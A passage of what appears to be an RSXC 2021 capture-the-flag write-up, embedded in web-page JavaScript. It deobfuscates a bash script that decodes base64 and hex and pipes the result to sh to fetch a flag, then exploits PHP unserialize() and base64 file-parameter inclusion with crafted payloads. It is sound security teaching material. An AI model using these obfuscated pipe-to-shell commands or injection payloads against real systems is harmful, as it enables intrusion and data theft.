<span class="token builtin class-name">eval</span> <span class="token string">"<span class="token variable">$N0q</span><span class="token variable">$x</span><span class="token variable">$Hc2</span><span class="token variable">$rQW</span>"</span></code>`,bu,Ya,R1,Vl,U1,N1,gu,Nn,CT=`<code class="language-bash"><span class="token comment"># 16-challenge2.sh</span>
<span class="token assign-left variable">gH4</span><span class="token operator">=</span><span class="token string">"Ed"</span><span class="token punctuation">;</span><span class="token assign-left variable">kM0</span><span class="token operator">=</span><span class="token string">"xSz"</span><span class="token punctuation">;</span><span class="token assign-left variable">c</span><span class="token operator">=</span><span class="token string">"ch"</span><span class="token punctuation">;</span><span class="token assign-left variable">L</span><span class="token operator">=</span><span class="token string">"4"</span><span class="token punctuation">;</span><span class="token assign-left variable">rQW</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token assign-left variable">fE1</span><span class="token operator">=</span><span class="token string">"lQ"</span><span class="token punctuation">;</span><span class="token assign-left variable">s</span><span class="token operator">=</span><span class="token string">" 'Kg2cgwHIk1CI0YTZzFmYgwHIis0ZyM2Z3hUS3FzQJlXMDl0aohUZndHSJhmQEpleRJTT4VlaOJTSt5kMRRkWysGVOJTWE5kMR1mTiEWY3RWbuF2dmFGJiISY3J3ZhRiIzcmaONTUE5kMN1mT41kaNpXSq5EakR1T6VkeNJSYhdHZt5WY3ZWYkIiaZJza61kMRRkTykVbOBTW65UMFpmTwMGVPpXWE5EMZJSY3J3ZhRiIzsmeNJTVUlVMJ1mT10kaNp3aU5kMZpWTxMGVOhmViE2dydWYkIieZRkT51EVPFTRy4kMVRlWyU0VOVTWU9keJpXT0UlIhdncnFGJioXVH5ENVRkTysmeOlXV61kenRlTx0ERPNzYE5EaWRlTz0UbONTUq1kMrpmT10kaOBTUq5EbaRkT6lkeNJSYhdHZt5WY3ZWYkICVOBTU65keNRVTxsGVOxmU6llMVRlT6lkaZpXUy00aORVTxklaOlmWq5EMR1mT1UlaOJTUq50aapWTyEkeORTW65EMRpmTqpFVNpXS61kIhF2dk1mbhdnZhRiIUl1MrpXT41kaNJTSt5UNNpmTwElaO1mWE5kMjRlT4lFRONza61kMRRkTyEkeOVTTq5UMFdlTppFVPpXS61UNVpmTykEVONTVUlVMBpXTyElaNp3aU5EakpmTxUVbOhmVU9kMrpXT51ERPFTQ61EbSR0TxElaOVzYq1UMNpXT0UFVOp3Z650MRRVWxUleOpmW65EMJpmT1kFVPpXWE5EMZRlWyEleNlXTq1kMVRkTwMmeNpXRU5UNVRlWw0UbOFTV61UeJJTTwMGRPNTU65EbKpnTyUkaOpmWq5kMZ1WTykFVOpXUq5kIhF2dk1mbhdnZhRiIU5kMBpXT10EROJTRq5UMNJSY3J3ZhRiI61keNFTWiE2dydWYkIieVpXT10ERPpXWq5kIhF2dk1mbhdnZhRiIq1keJpmT31keOpXTq5UeNR0T6NmeNFTWiE2dydWYkIiejpXTiEWY3RWbuF2dmFGJiQkTy0kaOdXTU1keNpmTiEWY3RWbuF2dmFGJiomTyUlaOhXTE5keNpXTy0keNJTU61UMZJSY3J3ZhRiI6VleNVTT61keJpmTw0EROJTTq5kMZRVTykkeNBTWE5keNpXTiEWY3RWbuF2dmFGJiISY3J3ZhRiI6lleNJSYhdHZt5WY3ZWYkIiaaJSYhdHZt5WY3ZWYkISbOxmWUpVeNpmT0MmeNNTS65UbKpmW5VkMNd3YE50MRpnT0klIhdncnFGJikXTt5UejRlTz0kaOdXSEV2dBlnYv50VaJCIvh2YltTeZ1TYhdHZt5WY3ZWY7QUT9E2dydWY
' | r"</span><span class="token punctuation">;</span><span class="token assign-left variable">HxJ</span><span class="token operator">=</span><span class="token string">"s"</span><span class="token punctuation">;</span><span class="token assign-left variable">Hc2</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token assign-left variable">f</span><span class="token operator">=</span><span class="token string">"as"</span><span class="token punctuation">;</span><span class="token assign-left variable">kcE</span><span class="token operator">=</span><span class="token string">"pas"</span><span class="token punctuation">;</span><span class="token assign-left variable">cEf</span><span class="token operator">=</span><span class="token string">"ae"</span><span class="token punctuation">;</span><span class="token assign-left variable">d</span><span class="token operator">=</span><span class="token string">"o"</span><span class="token punctuation">;</span><span class="token assign-left variable">V9z</span><span class="token operator">=</span><span class="token string">"6"</span><span class="token punctuation">;</span><span class="token assign-left variable">P8c</span><span class="token operator">=</span><span class="token string">"if"</span><span class="token punctuation">;</span><span class="token assign-left variable">U</span><span class="token operator">=</span><span class="token string">" -d"</span><span class="token punctuation">;</span><span class="token assign-left variable">Jc</span><span class="token operator">=</span><span class="token string">"ef"</span><span class="token punctuation">;</span><span class="token assign-left variable">N0q</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span><span class="token string">"b"</span><span class="token punctuation">;</span><span class="token assign-left variable">w</span><span class="token operator">=</span><span class="token string">"e"</span><span class="token punctuation">;</span><span class="token assign-left variable">b</span><span class="token operator">=</span><span class="token string">"v |"</span><span class="token punctuation">;</span><span class="token assign-left variable">Tx</span><span class="token operator">=</span><span class="token string">"Eds"</span><span class="token punctuation">;</span><span class="token assign-left variable">xZp</span><span class="token operator">=</span><span class="token string">""</span>
<span class="token assign-left variable">x</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$Hc2</span><span class="token variable">$w</span><span class="token variable">$c</span><span class="token variable">$rQW</span><span class="token variable">$d</span><span class="token variable">$s</span><span class="token variable">$w</span><span class="token variable">$b</span><span class="token variable">$Hc2</span><span class="token variable">$v</span><span class="token variable">$xZp</span><span class="token variable">$f</span><span class="token variable">$w</span><span class="token variable">$V9z</span><span class="token variable">$rQW</span><span class="token variable">$L</span><span class="token variable">$U</span><span class="token variable">$xZp</span>"</span><span class="token variable">)</span></span>
<span class="token builtin class-name">echo</span> <span class="token variable">$x</span> <span class="token operator">|</span> base64
<span class="token comment">#eval "$N0q$x$Hc2$rQW"</span></code>`,vu,Eo,W1,_u,Wn,DT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">bash</span> <span class="token number">16</span>-challenge2.sh <span class="token operator">|</span> base64 -d
<span class="token builtin class-name">echo</span> <span class="token string">'Kg2cgwHIk1CI0YTZzFmYgwHIis0ZyM2Z3hUS3FzQJlXMDl0aohUZndHSJhmQEpleRJTT4VlaOJTSt5kMRRkWysGVOJTWE5kMR1mTiEWY3RWbuF2dmFGJiISY3J3ZhRiIzcmaONTUE5kMN1mT41kaNpXSq5EakR1T6VkeNJSYhdHZt5WY3ZWYkIiaZJza61kMRRkTykVbOBTW65UMFpmTwMGVPpXWE5EMZJSY3J3ZhRiIzsmeNJTVUlVMJ1mT10kaNp3aU5kMZpWTxMGVOhmViE2dydWYkIieZRkT51EVPFTRy4kMVRlWyU0VOVTWU9keJpXT0UlIhdncnFGJioXVH5ENVRkTysmeOlXV61kenRlTx0ERPNzYE5EaWRlTz0UbONTUq1kMrpmT10kaOBTUq5EbaRkT6lkeNJSYhdHZt5WY3ZWYkICVOBTU65keNRVTxsGVOxmU6llMVRlT6lkaZpXUy00aORVTxklaOlmWq5EMR1mT1UlaOJTUq50aapWTyEkeORTW65EMRpmTqpFVNpXS61kIhF2dk1mbhdnZhRiIUl1MrpXT41kaNJTSt5UNNpmTwElaO1mWE5kMjRlT4lFRONza61kMRRkTyEkeOVTTq5UMFdlTppFVPpXS61UNVpmTykEVONTVUlVMBpXTyElaNp3aU5EakpmTxUVbOhmVU9kMrpXT51ERPFTQ61EbSR0TxElaOVzYq1UMNpXT0UFVOp3Z650MRRVWxUleOpmW65EMJpmT1kFVPpXWE5EMZRlWyEleNlXTq1kMVRkTwMmeNpXRU5UNVRlWw0UbOFTV61UeJJTTwMGRPNTU65EbKpnTyUkaOpmWq5kMZ1WTykFVOpXUq5kIhF2dk1mbhdnZhRiIU5kMBpXT10EROJTRq5UMNJSY3J3ZhRiI61keNFTWiE2dydWYkIieVpXT10ERPpXWq5kIhF2dk1mbhdnZhRiIq1keJpmT31keOpXTq5UeNR0T6NmeNFTWiE2dydWYkIiejpXTiEWY3RWbuF2dmFGJiQkTy0kaOdXTU1keNpmTiEWY3RWbuF2dmFGJiomTyUlaOhXTE5keNpXTy0keNJTU61UMZJSY3J3ZhRiI6VleNVTT61keJpmTw0EROJTTq5kMZRVTykkeNBTWE5keNpXTiEWY3RWbuF2dmFGJiISY3J3ZhRiI6lleNJSYhdHZt5WY3ZWYkIiaaJSYhdHZt5WY3ZWYkISbOxmWUpVeNpmT0MmeNNTS65UbKpmW5VkMNd3YE50MRpnT0klIhdncnFGJikXTt5UejRlTz0kaOdXSEV2dBlnYv50VaJCIvh2YltTeZ1TYhdHZt5WY3ZWY7QUT9E2dydWY '</span> <span class="token operator">|</span> <span class="token function">rev</span> <span class="token operator">|</span>base64 -d
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">echo</span> <span class="token string">'Kg2cgwHIk1CI0YTZzFmYgwHIis0ZyM2Z3hUS3FzQJlXMDl0aohUZndHSJhmQEpleRJTT4VlaOJTSt5kMRRkWysGVOJTWE5kMR1mTiEWY3RWbuF2dmFGJiISY3J3ZhRiIzcmaONTUE5kMN1mT41kaNpXSq5EakR1T6VkeNJSYhdHZt5WY3ZWYkIiaZJza61kMRRkTykVbOBTW65UMFpmTwMGVPpXWE5EMZJSY3J3ZhRiIzsmeNJTVUlVMJ1mT10kaNp3aU5kMZpWTxMGVOhmViE2dydWYkIieZRkT51EVPFTRy4kMVRlWyU0VOVTWU9keJpXT0UlIhdncnFGJioXVH5ENVRkTysmeOlXV61kenRlTx0ERPNzYE5EaWRlTz0UbONTUq1kMrpmT10kaOBTUq5EbaRkT6lkeNJSYhdHZt5WY3ZWYkICVOBTU65keNRVTxsGVOxmU6llMVRlT6lkaZpXUy00aORVTxklaOlmWq5EMR1mT1UlaOJTUq50aapWTyEkeORTW65EMRpmTqpFVNpXS61kIhF2dk1mbhdnZhRiIUl1MrpXT41kaNJTSt5UNNpmTwElaO1mWE5kMjRlT4lFRONza61kMRRkTyEkeOVTTq5UMFdlTppFVPpXS61UNVpmTykEVONTVUlVMBpXTyElaNp3aU5EakpmTxUVbOhmVU9kMrpXT51ERPFTQ61EbSR0TxElaOVzYq1UMNpXT0UFVOp3Z650MRRVWxUleOpmW65EMJpmT1kFVPpXWE5EMZRlWyEleNlXTq1kMVRkTwMmeNpXRU5UNVRlWw0UbOFTV61UeJJTTwMGRPNTU65EbKpnTyUkaOpmWq5kMZ1WTykFVOpXUq5kIhF2dk1mbhdnZhRiIU5kMBpXT10EROJTRq5UMNJSY3J3ZhRiI61keNFTWiE2dydWYkIieVpXT10ERPpXWq5kIhF2dk1mbhdnZhRiIq1keJpmT31keOpXTq5UeNR0T6NmeNFTWiE2dydWYkIiejpXTiEWY3RWbuF2dmFGJiQkTy0kaOdXTU1keNpmTiEWY3RWbuF2dmFGJiomTyUlaOhXTE5keNpXTy0keNJTU61UMZJSY3J3ZhRiI6VleNVTT61keJpmTw0EROJTTq5kMZRVTykkeNBTWE5keNpXTiEWY3RWbuF2dmFGJiISY3J3ZhRiI6lleNJSYhdHZt5WY3ZWYkIiaaJSYhdHZt5WY3ZWYkISbOxmWUpVeNpmT0MmeNNTS65UbKpmW5VkMNd3YE50MRpnT0klIhdncnFGJikXTt5UejRlTz0kaOdXSEV2dBlnYv50VaJCIvh2YltTeZ1TYhdHZt5WY3ZWY7QUT9E2dydWY'</span> <span class="token operator">|</span> <span class="token function">rev</span> <span class="token operator">|</span>base64 -d
<span class="token assign-left variable">agrwa</span><span class="token operator">=</span>MD<span class="token punctuation">;</span><span class="token assign-left variable">afwanmdwaa</span><span class="token operator">=</span>Yy<span class="token punctuation">;</span><span class="token builtin class-name">echo</span> <span class="token string">"ZWNobyAweDIwNjM3NTcyNmMy"</span><span class="token variable">$agrwa</span><span class="token string">"Y4NzQ3NDcwM2EyZjJmNzI3Mzc4NjMyZTZlNm"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"Zj"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzYz"</span><span class="token variable">$agrwa</span><span class="token string">""</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzMzNDY0MzI2MTY2NjM2NDM0NjIzMzM5MzUz"</span><span class="token variable">$agrwa</span><span class="token string">"Y1MzQ2MzM2MzMzNDMxNjU2Nj"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"NjMzMTMwNjM2ND"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"Mzcz"</span><span class="token variable">$agrwa</span><span class="token string">"Y1MzczODMyNjMzNzMwNjIzMj"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"NjYzODM5MzUz"</span><span class="token variable">$agrwa</span><span class="token string">"Y1MzMz"</span><span class="token variable">$agrwa</span><span class="token string">"M1NjE2NDM5MzA2NT"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"NjQzNTY2MmY2NjZjNjE2NzJlNzQ3ODc0M2IyMzU1NmM0ZTU5NTEzMzc0NDU2MjMyMzQ2ZTY0NDYzOTY5NjI0NzZjNzU1YTQ3NzgzNTU4MzM1Mjc5NjQ1ODRlMzA1ODMyMzk2OTVhNmU1NjdhNTkzMjQ2MzA1YTU3NTI2NjU5MzIzOTZiNWE1NjM5NzA2NDQ2Mzk3NDYxNTc2NDZmNjQ0NjM5NmI2MjMxMzk3YT"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzIzMTZjNjQ0NzY4NzA2MjZkNjQ2NjU5NmQ0NjZiNjY1MTNkM2QzYjIzNTU2YzRlNTk1MTMzNzQ0NT"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzIzNDZlNjQ0NjM5Njk2MjQ3NmM3NTVhNDc3ODM1NTgzMzUyNzk2NDU4NGUz"</span><span class="token variable">$agrwa</span><span class="token string">"U4MzIzOTY5NWE2ZTU2N2E1OTMyNDYz"</span><span class="token variable">$agrwa</span><span class="token string">"VhNTc1MjY2NTkzMjM5NmI1YTU2Mzk3"</span><span class="token variable">$agrwa</span><span class="token string">"Y0NDYzOTc0NjE1NzY0NmY2NDQ2Mzk2Yj"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzEzOTdhNjIzMjMxNmM2NDQ3Njg3"</span><span class="token variable">$agrwa</span><span class="token string">""</span><span class="token variable">$afwanmdwaa</span><span class="token string">"NmQ2NDY2NTk2ZDQ2NmI2NjUxM2QzZDBhIHwgeHhkIC1yIC1wIHwgc2gK"</span> <span class="token operator">|</span> base64 -d <span class="token operator">|</span> <span class="token function">sh</span></code>`,wu,X,S1,xl,M1,I1,Rl,O1,F1,Eu,Sn,YT=`<code class="language-bash"><span class="token comment"># 16-challenge3.sh</span>
<span class="token assign-left variable">agrwa</span><span class="token operator">=</span>MD<span class="token punctuation">;</span><span class="token assign-left variable">afwanmdwaa</span><span class="token operator">=</span>Yy<span class="token punctuation">;</span><span class="token builtin class-name">echo</span> <span class="token string">"ZWNobyAweDIwNjM3NTcyNmMy"</span><span class="token variable">$agrwa</span><span class="token string">"Y4NzQ3NDcwM2EyZjJmNzI3Mzc4NjMyZTZlNm"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"Zj"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzYz"</span><span class="token variable">$agrwa</span><span class="token string">""</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzMzNDY0MzI2MTY2NjM2NDM0NjIzMzM5MzUz"</span><span class="token variable">$agrwa</span><span class="token string">"Y1MzQ2MzM2MzMzNDMxNjU2Nj"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"NjMzMTMwNjM2ND"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"Mzcz"</span><span class="token variable">$agrwa</span><span class="token string">"Y1MzczODMyNjMzNzMwNjIzMj"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"NjYzODM5MzUz"</span><span class="token variable">$agrwa</span><span class="token string">"Y1MzMz"</span><span class="token variable">$agrwa</span><span class="token string">"M1NjE2NDM5MzA2NT"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"NjQzNTY2MmY2NjZjNjE2NzJlNzQ3ODc0M2IyMzU1NmM0ZTU5NTEzMzc0NDU2MjMyMzQ2ZTY0NDYzOTY5NjI0NzZjNzU1YTQ3NzgzNTU4MzM1Mjc5NjQ1ODRlMzA1ODMyMzk2OTVhNmU1NjdhNTkzMjQ2MzA1YTU3NTI2NjU5MzIzOTZiNWE1NjM5NzA2NDQ2Mzk3NDYxNTc2NDZmNjQ0NjM5NmI2MjMxMzk3YT"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzIzMTZjNjQ0NzY4NzA2MjZkNjQ2NjU5NmQ0NjZiNjY1MTNkM2QzYjIzNTU2YzRlNTk1MTMzNzQ0NT"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzIzNDZlNjQ0NjM5Njk2MjQ3NmM3NTVhNDc3ODM1NTgzMzUyNzk2NDU4NGUz"</span><span class="token variable">$agrwa</span><span class="token string">"U4MzIzOTY5NWE2ZTU2N2E1OTMyNDYz"</span><span class="token variable">$agrwa</span><span class="token string">"VhNTc1MjY2NTkzMjM5NmI1YTU2Mzk3"</span><span class="token variable">$agrwa</span><span class="token string">"Y0NDYzOTc0NjE1NzY0NmY2NDQ2Mzk2Yj"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzEzOTdhNjIzMjMxNmM2NDQ3Njg3"</span><span class="token variable">$agrwa</span><span class="token string">""</span><span class="token variable">$afwanmdwaa</span><span class="token string">"NmQ2NDY2NTk2ZDQ2NmI2NjUxM2QzZDBhIHwgeHhkIC1yIC1wIHwgc2gK"</span> <span class="token operator">|</span> base64 -d</code>`,Tu,W,z1,Ul,C1,D1,Nl,Y1,Z1,Wl,J1,j1,yu,Mn,ZT=`<code class="language-bash">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">bash</span> <span class="token number">16</span>-challenge3.sh
<span class="token builtin class-name">echo</span> 0x206375726c20687474703a2f2f727378632e6e6f2f623630623334643261666364346233393530653463363334316566626331306364623730653738326337306232626638393530653330356164393065626435662f666c61672e7478743b23556c4e59513374456232346e6446396962476c755a4778355833527964584e30583239695a6e567a593246305a5752665932396b5a563970644639746157646f6446396b6231397a6232316c64476870626d6466596d466b66513d3d3b23556c4e59513374456232346e6446396962476c755a4778355833527964584e30583239695a6e567a593246305a5752665932396b5a563970644639746157646f6446396b6231397a6232316c64476870626d6466596d466b66513d3d0a <span class="token operator">|</span> xxd -r -p <span class="token operator">|</span> <span class="token function">sh</span>
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">echo</span> 0x206375726c20687474703a2f2f727378632e6e6f2f623630623334643261666364346233393530653463363334316566626331306364623730653738326337306232626638393530653330356164393065626435662f666c61672e7478743b23556c4e59513374456232346e6446396962476c755a4778355833527964584e30583239695a6e567a593246305a5752665932396b5a563970644639746157646f6446396b6231397a6232316c64476870626d6466596d466b66513d3d3b23556c4e59513374456232346e6446396962476c755a4778355833527964584e30583239695a6e567a593246305a5752665932396b5a563970644639746157646f6446396b6231397a6232316c64476870626d6466596d466b66513d3d0a <span class="token operator">|</span> xxd -r -p
 <span class="token function">curl</span> http://rsxc.no/b60b34d2afcd4b3950e4c6341efbc10cdb70e782c70b2bf8950e305ad90ebd5f/flag.txt<span class="token punctuation">;</span><span class="token comment">#UlNYQ3tEb24ndF9ibGluZGx5X3RydXN0X29iZnVzY2F0ZWRfY29kZV9pdF9taWdodF9kb19zb21ldGhpbmdfYmFkfQ==;#UlNYQ3tEb24ndF9ibGluZGx5X3RydXN0X29iZnVzY2F0ZWRfY29kZV9pdF9taWdodF9kb19zb21ldGhpbmdfYmFkfQ==</span></code>`,Vu,To,P1,xu,In,JT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">echo</span> <span class="token assign-left variable">UlNYQ3tEb24ndF9ibGluZGx5X3RydXN0X29iZnVzY2F0ZWRfY29kZV9pdF9taWdodF9kb19zb21ldGhpbmdfYmFkfQ</span><span class="token operator">==</span> <span class="token operator">|</span> base64 -d
RSXC<span class="token punctuation">&#123;</span>Don't_blindly_trust_obfuscated_code_it_might_do_something_bad<span class="token punctuation">&#125;</span></code>`,Ru,On,H1,Sl,A1,Uu,Fn,yo,X1,Nu,zn,Vo,q1,Wu,xo,Ro,G1,_a,B1,Su,Cn,Uo,$1,Mu,m,Q1,Ml,L1,K1,Il,a2,s2,Ol,n2,e2,Fl,t2,o2,zl,p2,l2,Cl,i2,c2,Dl,r2,u2,Yl,k2,h2,Iu,Dn,jT=`<code class="language-php"><span class="token comment">// index.php</span>
file <span class="token operator">=</span> <span class="token constant">__DIR__</span><span class="token operator">.</span> <span class="token string double-quoted-string">"/files/"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">realpath</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token constant">__DIR__</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">__DIR__</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Finding your card in /files"</span><span class="token punctuation">)</span> <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"NO \xF0\u0178\u02DC "</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'card'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'card'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token variable">$card</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'card'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> <span class="token variable">$card</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Card</span><span class="token punctuation">;</span> <span class="token variable">$card</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'files/card.txt'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token variable">$card</span><span class="token operator">-></span><span class="token function">displayCard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code>`,Ou,S,f2,Zl,d2,m2,Jl,b2,g2,jl,v2,_2,Fu,Yn,PT=`<code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Card</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">private</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
	<span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flag.txt'</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Card</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// Tzo0OiJDYXJkIjoxOntzOjEwOiIAQ2FyZABmaWxlIjtzOjg6ImZsYWcudHh0Ijt9</span>
<span class="token delimiter important">?></span></span></code>`,zu,Zn,HT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> http://rsxc.no:20017/?card<span class="token operator">=</span>Tzo0OiJDYXJkIjoxOntzOjEwOiIAQ2FyZABmaWxlIjtzOjg6ImZsYWcudHh0Ijt9
Finding your card <span class="token keyword">in</span> /files
RSXC<span class="token punctuation">&#123;</span>Care_needs_to_be_taken_with_user_supplied_input.It_should_never_be_trusted<span class="token punctuation">&#125;</span></code>`,Cu,Jn,w2,Pl,E2,Du,jn,No,T2,Yu,Pn,Wo,y2,Zu,So,Mo,V2,wa,x2,Ju,Hn,Io,R2,ju,Za,U2,Hl,N2,W2,Pu,An,AT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">unzip</span> <span class="token number">18</span>-challenge.zip
Archive:  <span class="token number">18</span>-challenge.zip
  inflating: Dockerfile
  inflating: docker-box.tar.gz
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">tar</span> -xzf docker-box.tar.gz
juki@izone:~/Desktop/ctf/rsxc2021$ strings docker-box.tar <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"RSXC"</span>
RSXC<span class="token punctuation">&#123;</span>Now_you_know_that_docker_images_are_like_onions.They_have_many_layers<span class="token punctuation">&#125;</span></code>`,Hu,Xn,S2,Al,M2,Au,qn,Oo,I2,Xu,Gn,Fo,O2,qu,zo,Co,F2,Ea,z2,Gu,Bn,Do,C2,Bu,g,D2,Xl,Y2,Z2,ql,J2,j2,Gl,P2,H2,Bl,A2,X2,$l,q2,G2,Ql,B2,$2,$u,E,Q2,Ll,L2,K2,Kl,ab,sb,ai,nb,eb,si,tb,ob,ni,pb,lb,Qu,$n,XT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">echo</span> <span class="token assign-left variable">dHJlZS50eHQ</span><span class="token operator">=</span> <span class="token operator">|</span> base64 -d
tree.txt</code>`,Lu,q,ib,ei,cb,rb,ti,ub,kb,Ku,Qn,qT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> -s http://rsxc.no:20019/card.php?card<span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> -n <span class="token string">"flag.txt"</span> <span class="token operator">|</span> base64<span class="token variable">)</span></span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"RSXC"</span>
RSXC<span class="token punctuation">&#123;</span>It_is_not_smart_to_let_people_include_whatever_they_want<span class="token punctuation">&#125;</span></code>`,ak,Ln,hb,oi,fb,sk,Kn,Yo,db,nk,ae,Zo,mb,ek,Jo,jo,bb,Ta,gb,tk,se,Po,vb,ok,Ho,_b,pk,ne,GT=`<code class="language-php">This is the code found in /api.php
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hmac'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"HTTP/1.0 400 Bad Request"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SECRET"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

